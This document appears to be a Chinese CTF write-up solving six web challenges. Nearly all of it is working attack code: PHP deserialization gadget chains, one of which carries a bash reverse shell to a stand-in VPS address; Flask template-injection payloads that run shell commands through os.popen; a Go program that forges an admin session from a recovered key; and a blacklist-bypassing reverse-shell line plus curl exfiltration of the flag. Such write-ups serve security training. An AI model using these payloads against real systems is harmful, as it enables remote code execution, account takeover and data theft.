### babyPOP

```php
<?php
class b {
    private $i_want_2_listen_2_MaoZhongDu;
    public function __construct($a)
    {
        $this->i_want_2_listen_2_MaoZhongDu = $a;
    }
}

class c {
    public function __wakeup()
    {
        a::$Do_u_like_JiaRan = true;
    }
}

class d {
    public function __invoke()
    {
        a::$Do_u_like_AFKL = true;
        return "关注嘉然," . $this->value;
    }
}

class e {
    public function __destruct()
    {
        if (a::$Do_u_like_JiaRan) {
            ($this->afkl)();
        } else {
            throw new Error("Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!");
        }
    }
}

$b = new b('bash -c "bash -i >& /dev/tcp/[vps-ip]/9999 0>&1"');
$c = new c();
$d = new d();
$d->value = $b;
$e = new e();
$e->afkl = $d;
echo urlencode(base64_encode(serialize([$c, $e])));
```

### babyPy
这题是个非常简单的Flask SSTI，没有任何过滤。
```
{{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}} 
```

### easyGO
在附件的`main.go`中发现密钥硬编码，和静态文件目录设置错误。
```go
package main

import (
	"SYC/geek/route"

	"github.com/gin-contrib/sessions"
	"github.com/gin-contrib/sessions/cookie"
	"github.com/gin-gonic/gin"
)

func main() {
	webapp := gin.Default()
	store := cookie.NewStore([]byte("[I AM NOT GONNA TELL YOU]"))// 硬编码了密钥

	webapp.Use(sessions.Sessions("PHPSESSION", store))
	webapp.Use(gin.Recovery())

	webapp.Static("/static", "./") // 静态文件设置为当前目录，表示我们可能拿到编译出来的二进制文件。

	route.SetRoute(webapp)

	// After executing `go build` in the current directory, AFKL puts the file that was just compiled into the /app folder.
	// 由上面的话可知，编译出来的文件名叫geek
	webapp.Run(":8080")
}
```
而想要拿到flag，需要成为admin。由此可以尝试拿到二进制文件后逆向出密钥，然后session伪造。
```go
app.GET("/flag", func(c *gin.Context) {
	sess := sessions.Default(c)
	user := sess.Get("user").(string)
	if strings.Compare(user, "admin") == 0 {
		data, _ := ioutil.ReadFile("/flag")
		c.JSON(200, gin.H{
			"flag": string(data),
		})
	} else {
		c.JSON(200, gin.H{
			"No!": "U are not admin!",
		})
	}
})
```
在`http://easyGO/static/geek`拿到二进制文件后，逆向得出密钥。
![image-20211119110632343](https://i.loli.net/2021/11/19/Z5LkmJToYOI7qjD.png)

然后session伪造
```go
package main

import (
	"github.com/gin-contrib/sessions"
	"github.com/gin-contrib/sessions/cookie"
	"github.com/gin-gonic/gin"
)

func main() {
	webapp := gin.Default()
	store := cookie.NewStore([]byte("WTF_HOw_d1d_U_kn0W_Th1s"))

	webapp.Use(sessions.Sessions("PHPSESSION", store))
	webapp.Use(gin.Recovery())

	webapp.GET("/", func(c *gin.Context) {
		sess := sessions.Default(c)
		sess.Set("user", "admin")
		sess.Save()
	})

	webapp.Run(":7777")
}
```


### easyPOP

```php
<?php
class a {
    public $test;
    public function __construct($a)
    {
        $this->test = $a;
    }
}

abstract class b {
    private $b = 1;
    public function __construct($a)
    {
        $this->b = $a;
    }
}

class c extends b {
    private $call;
    protected $value;

    public function __construct($a, $b)
    {
        $this->call = $a;
        $this->value = $b;
    }

    public function setB($c) {
        parent::__construct($c);
    }
}

class d {
    public $value;

    public function __construct($a)
    {
        $this->value = $a;

    }
}

$c = new c(
    [new d("system"), "eval"],
    [new d("echo 'wtf'>./233"), "eval"],
);
$c->setB([$c, "eval"]);
$exp = new a($c);

echo base64_encode(serialize($exp));
```


### easyPy
```
http://easypy/calc?calc={{(1=&answer=1)|attr(request.args.class)|attr(request.args.mro)|attr(request.args.getitem)(2)|attr(request.args.subclasses)()|attr(request.args.getitem)(133)|attr(request.args.init)|attr(request.args.globals)|attr(request.args.getitem)(request.args.popen)(request.args.data)|attr(request.args.read)()}}&class=__class__&mro=__mro__&getitem=__getitem__&subclasses=__subclasses__&init=__init__&globals=__globals__&popen=popen&data=cat+/flag&read=read
```

### where_is_my_FUMO
```php
<?php
function chijou_kega_no_junnka($str) {
    $black_list = [">", ";", "|", "{", "}", "/", " "];
    return str_replace($black_list, "", $str);
}

if (isset($_GET['DATA'])) {
    $data = $_GET['DATA'];
    $addr = chijou_kega_no_junnka($data['ADDR']);
    $port = chijou_kega_no_junnka($data['PORT']);
    exec("bash -c \"bash -i < /dev/tcp/$addr/$port\"");
} else {
    highlight_file(__FILE__);
}
```

三个考点：
1. 使用GET请求传输数组
`http://fumo/index.php?DATA[ADDR]=vps-ip&DATA[PORT]=9999`

2. 反弹shell
这里的反弹shell只能反弹回一个没有回显的shell。
解决办法很多，可以考虑二次反弹一个完整的shell，或者绕过黑名单。
`bash -c "bash -i < /dev/tcp/ip/9999 1<&0 2<&0""`

3. 反弹shell后的文件获取
内置环境有`curl`，可以将图片外带到自己的服务器。

![flag](https://i.loli.net/2021/11/19/GEDL6O2QprJwXds.png)
